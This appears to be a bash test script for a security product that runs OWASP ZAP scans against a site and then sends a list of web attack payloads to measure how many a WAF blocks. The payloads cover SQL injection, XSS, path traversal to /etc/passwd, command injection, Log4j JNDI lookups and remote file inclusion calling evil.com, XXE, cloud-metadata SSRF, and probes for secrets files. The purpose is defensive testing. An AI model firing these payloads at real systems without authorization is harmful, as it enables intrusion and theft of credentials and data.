#!/bin/bash
# ============================================================================
# Jabali Security — ZAP Automated Security Scan
# ============================================================================
# Runs OWASP ZAP against a target site using the ZAP API.
# Performs spider crawl, active scan, and generates a report.
#
# Usage:
#   ./tests/test_zap_scan.sh <target_url> [--zap-api <zap_api_url>]
#
# Examples:
#   ./tests/test_zap_scan.sh https://123123.com
#   ./tests/test_zap_scan.sh https://123123.com --zap-api http://192.168.100.100:8090
#
# Requirements: curl, jq, running ZAP instance with API enabled
# ============================================================================
set -uo pipefail

# ── Config ──────────────────────────────────────────────────────────────────

TARGET="${1:-}"
shift || true

ZAP_API="http://192.168.100.100:8090"
ZAP_API_KEY=""
REPORT_DIR="/tmp"
MAX_SPIDER_MINS=5
MAX_SCAN_MINS=30

while [[ $# -gt 0 ]]; do
    case "$1" in
        --zap-api) ZAP_API="$2"; shift 2 ;;
        --api-key) ZAP_API_KEY="$2"; shift 2 ;;
        --report-dir) REPORT_DIR="$2"; shift 2 ;;
        --max-spider) MAX_SPIDER_MINS="$2"; shift 2 ;;
        --max-scan) MAX_SCAN_MINS="$2"; shift 2 ;;
        *) echo "Unknown option: $1"; exit 1 ;;
    esac
done

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target_url> [--zap-api <url>] [--api-key <key>]"
    echo "Example: $0 https://123123.com --zap-api http://192.168.100.100:8090"
    exit 1
fi

REPORT_FILE="${REPORT_DIR}/jabali-zap-$(date +%Y%m%d-%H%M%S).html"
REPORT_JSON="${REPORT_DIR}/jabali-zap-$(date +%Y%m%d-%H%M%S).json"

# ── Helpers ────────────────────────────────────────────────────────────────

red()    { printf "\033[0;31m%s\033[0m\n" "$*"; }
green()  { printf "\033[0;32m%s\033[0m\n" "$*"; }
yellow() { printf "\033[0;33m%s\033[0m\n" "$*"; }
bold()   { printf "\033[1m%s\033[0m\n" "$*"; }

zap_api() {
    local endpoint="$1"
    shift
    local url="${ZAP_API}${endpoint}"
    if [ -n "$ZAP_API_KEY" ]; then
        url="${url}$(echo "$endpoint" | grep -q '?' && echo '&' || echo '?')apikey=${ZAP_API_KEY}"
    fi
    curl -s --max-time 30 "$url" "$@" 2>/dev/null
}

zap_api_val() {
    zap_api "$1" | jq -r "$2" 2>/dev/null
}

spinner() {
    local pid=$1
    local msg="$2"
    local chars='⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏'
    while kill -0 "$pid" 2>/dev/null; do
        for (( i=0; i<${#chars}; i++ )); do
            printf "\r  %s %s" "${chars:$i:1}" "$msg"
            sleep 0.1
        done
    done
    printf "\r"
}

# ── Verify ZAP is running ──────────────────────────────────────────────────

bold "╔════════════════════════════════════════════════════════════════╗"
bold "║      Jabali Security — ZAP Automated Security Scan          ║"
bold "╚════════════════════════════════════════════════════════════════╝"
echo ""
echo "  Target:    ${TARGET}"
echo "  ZAP API:   ${ZAP_API}"
echo "  Report:    ${REPORT_FILE}"
echo ""

VERSION=$(zap_api_val "/JSON/core/view/version/" ".version")
if [ -z "$VERSION" ] || [ "$VERSION" = "null" ]; then
    red "ERROR: Cannot connect to ZAP API at ${ZAP_API}"
    red "Make sure ZAP is running and the API is accessible."
    exit 1
fi
green "  ZAP version: ${VERSION}"
echo ""

# ── Phase 1: Configure scan policies ───────────────────────────────────────

bold "Phase 1: Configuring scan policies"

# Set scan strength and threshold
zap_api "/JSON/ascan/action/setOptionDefaultPolicy/?id=0" > /dev/null
zap_api "/JSON/ascan/action/setOptionAttackStrength/?String=MEDIUM" > /dev/null
zap_api "/JSON/ascan/action/setOptionAlertThreshold/?String=LOW" > /dev/null

# Exclude common false-positive paths
for exclude in ".*logout.*" ".*signout.*" ".*wp-cron\.php.*"; do
    zap_api "/JSON/spider/action/excludeFromScan/?regex=${exclude}" > /dev/null
done

# Set max scan duration
zap_api "/JSON/ascan/action/setOptionMaxScanDurationInMins/?Integer=${MAX_SCAN_MINS}" > /dev/null

green "  Scan policies configured"

# ── Phase 2: Spider (crawl) ────────────────────────────────────────────────

bold "Phase 2: Spider crawl"

SPIDER_ID=$(zap_api_val "/JSON/spider/action/scan/?url=${TARGET}&maxChildren=50&recurse=true" ".scan")
if [ -z "$SPIDER_ID" ] || [ "$SPIDER_ID" = "null" ]; then
    red "  Failed to start spider"
    exit 1
fi
echo "  Spider started (ID: ${SPIDER_ID})"

# Wait for spider to complete
DEADLINE=$((SECONDS + MAX_SPIDER_MINS * 60))
while [ "$SECONDS" -lt "$DEADLINE" ]; do
    STATUS=$(zap_api_val "/JSON/spider/view/status/?scanId=${SPIDER_ID}" ".status")
    if [ "$STATUS" = "100" ]; then
        break
    fi
    printf "\r  Crawling... %s%%" "$STATUS"
    sleep 2
done
printf "\r"

URLS_FOUND=$(zap_api_val "/JSON/spider/view/results/?scanId=${SPIDER_ID}" ".results | length")
green "  Spider complete: ${URLS_FOUND} URLs discovered"

# ── Phase 3: Ajax Spider (optional, for JS-heavy sites) ────────────────────

bold "Phase 3: Ajax Spider (10 seconds for JS rendering)"

zap_api "/JSON/ajaxSpider/action/scan/?url=${TARGET}" > /dev/null
sleep 10
zap_api "/JSON/ajaxSpider/action/stop/" > /dev/null

AJAX_RESULTS=$(zap_api_val "/JSON/ajaxSpider/view/numberOfResults/" ".numberOfResults")
green "  Ajax spider found ${AJAX_RESULTS:-0} additional resources"

# ── Phase 4: Active Scan ──────────────────────────────────────────────────

bold "Phase 4: Active scan (max ${MAX_SCAN_MINS} minutes)"

SCAN_ID=$(zap_api_val "/JSON/ascan/action/scan/?url=${TARGET}&recurse=true" ".scan")
if [ -z "$SCAN_ID" ] || [ "$SCAN_ID" = "null" ]; then
    red "  Failed to start active scan"
    exit 1
fi
echo "  Active scan started (ID: ${SCAN_ID})"

DEADLINE=$((SECONDS + MAX_SCAN_MINS * 60))
while [ "$SECONDS" -lt "$DEADLINE" ]; do
    STATUS=$(zap_api_val "/JSON/ascan/view/status/?scanId=${SCAN_ID}" ".status")
    if [ "$STATUS" = "100" ]; then
        break
    fi
    printf "\r  Scanning... %s%%" "$STATUS"
    sleep 5
done
printf "\r"

green "  Active scan complete"

# ── Phase 4b: Targeted WAF bypass tests ───────────────────────────────────

bold "Phase 4b: Targeted attack payloads"

WAF_PASS=0
WAF_BLOCK=0
WAF_TOTAL=0

test_payload() {
    local name="$1"
    local url="$2"
    local method="${3:-GET}"
    local data="${4:-}"
    WAF_TOTAL=$((WAF_TOTAL + 1))

    local code
    if [ "$method" = "POST" ]; then
        code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 -X POST -d "$data" "$url" 2>/dev/null) || true
    else
        code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 "$url" 2>/dev/null) || true
    fi

    if [ "$code" = "403" ] || [ "$code" = "406" ] || [ "$code" = "444" ]; then
        WAF_BLOCK=$((WAF_BLOCK + 1))
        green "  [BLOCKED] ${name} -> ${code}"
    else
        WAF_PASS=$((WAF_PASS + 1))
        red "  [PASSED]  ${name} -> ${code}"
    fi
}

echo ""
echo "  SQL Injection variants:"
test_payload "SQLi: UNION SELECT"          "${TARGET}/?id=1+UNION+SELECT+NULL,NULL,NULL--"
test_payload "SQLi: blind boolean"         "${TARGET}/?id=1+AND+1=1--"
test_payload "SQLi: blind time"            "${TARGET}/?id=1+AND+SLEEP(5)--"
test_payload "SQLi: stacked queries"       "${TARGET}/?id=1;DROP+TABLE+users--"
test_payload "SQLi: hex bypass"            "${TARGET}/?id=0x31+UNION+SELECT+0x61646d696e"
test_payload "SQLi: double encode"         "${TARGET}/?id=1%2527+OR+1=1--"
test_payload "SQLi: POST login"            "${TARGET}/wp-login.php" POST "log=admin'+OR+1=1--&pwd=test"
test_payload "SQLi: comment bypass"        "${TARGET}/?id=1'/**/OR/**/1=1--"

echo ""
echo "  XSS variants:"
test_payload "XSS: basic script"           "${TARGET}/?s=<script>alert(1)</script>"
test_payload "XSS: img onerror"            "${TARGET}/?s=<img+src=x+onerror=alert(1)>"
test_payload "XSS: SVG onload"             "${TARGET}/?s=<svg/onload=alert(1)>"
test_payload "XSS: event handler"          "${TARGET}/?s=<body+onload=alert(1)>"
test_payload "XSS: javascript URI"         "${TARGET}/?s=javascript:alert(document.cookie)"
test_payload "XSS: data URI"              "${TARGET}/?s=<object+data=data:text/html,<script>alert(1)</script>>"
test_payload "XSS: polyglot"              "${TARGET}/?s=jaVasCript:/*-/*\`/*\\\`/*'/*\"/**/(/*+*/oNcliCk=alert()+)//"

echo ""
echo "  Path traversal & LFI:"
test_payload "LFI: etc/passwd"             "${TARGET}/?file=../../../etc/passwd"
test_payload "LFI: null byte"              "${TARGET}/?file=../../../etc/passwd%00"
test_payload "LFI: double encode"          "${TARGET}/?file=..%252f..%252f..%252fetc%252fpasswd"
test_payload "LFI: php filter"             "${TARGET}/?page=php://filter/convert.base64-encode/resource=/etc/passwd"
test_payload "LFI: php input"              "${TARGET}/?page=php://input"
test_payload "LFI: data scheme"            "${TARGET}/?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=="
test_payload "RFI: external"               "${TARGET}/?page=http://evil.com/shell.txt"

echo ""
echo "  Command injection:"
test_payload "CMDi: semicolon"             "${TARGET}/?cmd=;cat+/etc/passwd"
test_payload "CMDi: pipe"                  "${TARGET}/?cmd=|ls+-la"
test_payload "CMDi: backtick"              "${TARGET}/?cmd=\`whoami\`"
test_payload "CMDi: dollar paren"          "${TARGET}/?cmd=\$(id)"

echo ""
echo "  Log4j / JNDI:"
test_payload "Log4j: jndi ldap"            "${TARGET}/?x=\${jndi:ldap://evil.com/a}"
test_payload "Log4j: nested bypass"        "${TARGET}/?x=\${j\${::-n}di:ldap://evil.com}"

echo ""
echo "  Protocol attacks:"
test_payload "XXE: xmlrpc"                 "${TARGET}/xmlrpc.php" POST '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
test_payload "SSRF: metadata"              "${TARGET}/?url=http://169.254.169.254/latest/meta-data/"
test_payload "SSTI: Jinja2"                "${TARGET}/?name={{7*7}}"
test_payload "SSTI: class chain"           "${TARGET}/?name={{config.__class__.__init__.__globals__}}"

echo ""
echo "  WordPress specific:"
test_payload "WP: wp-config backup"        "${TARGET}/wp-config.php.bak"
test_payload "WP: debug log"               "${TARGET}/wp-content/debug.log"
test_payload "WP: user enum REST"          "${TARGET}/wp-json/wp/v2/users"
test_payload "WP: install.php"             "${TARGET}/wp-admin/install.php"
test_payload "WP: shell upload path"       "${TARGET}/wp-content/uploads/shell.php"
test_payload "WP: .env file"               "${TARGET}/.env"
test_payload "WP: .git HEAD"               "${TARGET}/.git/HEAD"
test_payload "WP: xmlrpc multicall"        "${TARGET}/xmlrpc.php" POST '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data></data></array></value></param></params></methodCall>'

echo ""
echo "  HTTP method probes:"
for method in TRACE TRACK PUT DELETE; do
    code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 -X "$method" "${TARGET}/" 2>/dev/null) || true
    if [ "$code" = "405" ] || [ "$code" = "403" ] || [ "$code" = "501" ]; then
        green "  [BLOCKED] ${method} method -> ${code}"
        WAF_BLOCK=$((WAF_BLOCK + 1))
    else
        yellow "  [ALLOWED] ${method} method -> ${code}"
    fi
    WAF_TOTAL=$((WAF_TOTAL + 1))
done

echo ""
BLOCK_RATE=0
if [ "$WAF_TOTAL" -gt 0 ]; then
    BLOCK_RATE=$((WAF_BLOCK * 100 / WAF_TOTAL))
fi
bold "  WAF Block Rate: ${WAF_BLOCK}/${WAF_TOTAL} (${BLOCK_RATE}%)"
if [ "$BLOCK_RATE" -ge 80 ]; then
    green "  Excellent WAF coverage"
elif [ "$BLOCK_RATE" -ge 60 ]; then
    yellow "  Good WAF coverage, some bypasses detected"
else
    red "  Poor WAF coverage — review ModSecurity rules"
fi

# ── Phase 5: Collect results ──────────────────────────────────────────────

bold "Phase 5: Results"

# Get alert summary
ALERTS_JSON=$(zap_api "/JSON/alert/view/alertsSummary/?baseurl=${TARGET}")

HIGH=$(echo "$ALERTS_JSON" | jq -r '.alertsSummary.High // 0')
MEDIUM=$(echo "$ALERTS_JSON" | jq -r '.alertsSummary.Medium // 0')
LOW=$(echo "$ALERTS_JSON" | jq -r '.alertsSummary.Low // 0')
INFO=$(echo "$ALERTS_JSON" | jq -r '.alertsSummary.Informational // 0')

echo ""
if [ "$HIGH" -gt 0 ] 2>/dev/null; then
    red "  HIGH:          ${HIGH}"
else
    green "  HIGH:          ${HIGH}"
fi
if [ "$MEDIUM" -gt 0 ] 2>/dev/null; then
    yellow "  MEDIUM:        ${MEDIUM}"
else
    green "  MEDIUM:        ${MEDIUM}"
fi
echo "  LOW:           ${LOW}"
echo "  INFORMATIONAL: ${INFO}"
echo ""

# Show individual alerts
bold "  Findings:"
ALERTS=$(zap_api "/JSON/alert/view/alerts/?baseurl=${TARGET}&start=0&count=100")
echo "$ALERTS" | jq -r '.alerts[] | "  [\(.risk)] \(.alert) — \(.url[:80])"' 2>/dev/null | sort -u | head -50

# ── Phase 6: Generate reports ─────────────────────────────────────────────

bold "Phase 6: Generating reports"

# HTML report
zap_api "/OTHER/core/other/htmlreport/" > "$REPORT_FILE"
green "  HTML report: ${REPORT_FILE}"

# JSON report
zap_api "/JSON/alert/view/alerts/?baseurl=${TARGET}&start=0&count=500" > "$REPORT_JSON"
green "  JSON report: ${REPORT_JSON}"

# ── Summary ───────────────────────────────────────────────────────────────

echo ""
bold "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
bold "SCAN COMPLETE"
bold "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "  Target:         ${TARGET}"
echo "  URLs crawled:   ${URLS_FOUND}"
echo "  HIGH alerts:    ${HIGH}"
echo "  MEDIUM alerts:  ${MEDIUM}"
echo "  LOW alerts:     ${LOW}"
echo "  INFO alerts:    ${INFO}"
echo ""
echo "  HTML report:    ${REPORT_FILE}"
echo "  JSON report:    ${REPORT_JSON}"
echo ""

TOTAL_ISSUES=$((HIGH + MEDIUM))
if [ "$TOTAL_ISSUES" -eq 0 ]; then
    green "  No HIGH or MEDIUM vulnerabilities found!"
elif [ "$HIGH" -gt 0 ]; then
    red "  ${HIGH} HIGH severity issues need immediate attention."
else
    yellow "  ${MEDIUM} MEDIUM severity issues found."
fi
echo ""
